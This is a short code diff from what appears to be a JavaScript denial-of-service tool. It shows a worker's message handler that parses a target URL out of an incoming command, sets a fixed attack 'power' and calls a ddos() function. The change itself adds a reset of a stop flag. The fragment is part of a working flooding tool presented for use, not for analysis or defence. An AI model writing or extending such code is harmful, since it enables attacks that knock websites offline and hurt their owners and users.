@@ -97,6 +97,7 @@ if (isMainThread) {
     }
     if (m.split('[*]x[*]')[0]) {
       running = true
+      stop = false
       var url = m.split('[*]x[*]')[0];
       var power = 620; // static power for now // parseInt(m.split('[*]x[*]')[1]) || 620
       ddos(url,power)
